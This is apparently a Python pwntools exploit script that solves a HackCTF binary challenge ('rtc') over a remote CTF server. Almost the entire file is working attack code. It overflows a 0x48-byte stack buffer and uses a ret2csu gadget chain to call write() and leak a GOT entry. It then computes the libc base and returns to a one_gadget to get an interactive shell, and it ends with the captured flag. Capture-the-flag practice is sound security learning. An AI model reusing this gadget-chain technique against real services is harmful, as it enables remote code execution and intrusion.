from pwn import * 

# 64bit binary,  run it , write and read 0x200 bytes. 
# input buf 0x7fffffffe360 , ret is 0x7fffffffe3a8 ,  0x48 byte.
# scenario : leak libc , call magic gadget
# missing rdx gadget. time to return to csu 
# for doing csu , func address should be func's GOT 
# after leak libc , call magic gadget 

state = 1

if state == 0:
	p = process("./rtc")
	log.info("run on locally")
else :
	p = remote("ctf.j0n9hyun.xyz",3025)
	log.info("run on remotely")

write_plt = 0x4004b0
write_got = 0x601018
main = 0x04005f6
p_rdi = 0x04006c3 # pop rdi ; ret

csu_pop = 0x04006BA # rbx,rbp,r12,r13,r14,r15
csu_call = 0x04006A0 # rdx->r13 , rsi->r14 , edi->r15, call r12, rbx=> 0 ,rbp=>1 
# => 0, 1, func , p3, p2, p1 

if state == 0:
	one_offset = [0x4f2c5,0x4f322,0x10a38c]
	write_offset = 0x110140
	execve_offset = 0xe4e30
else :
	one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
	write_offset = 0xf72b0 
	execve_offset = 0xcc770

payload = "a"*0x48
payload += p64(csu_pop) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) # write(1,got,8)
payload += p64(csu_call) + "b"*8 
payload += p64(0) + p64(1) + p64(main) + p64(8) + p64(write_got) + p64(1) #dummy
payload += p64(main)

#payload += p64(csu_pop) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) # write(1,got,8)



p.sendlineafter("Up?",payload) 

print p.recvline()
rcv = u64(p.recv(8))
libc = rcv - write_offset
one = libc+one_offset[1]

log.info("addr :"+hex(libc))



payload2 = "b"*0x48
payload2 += p64(one)
pause()
p.sendlineafter("Up?",payload2) 

p.interactive()

#HackCTF{4ll_r1ght_c5u_1n1t!}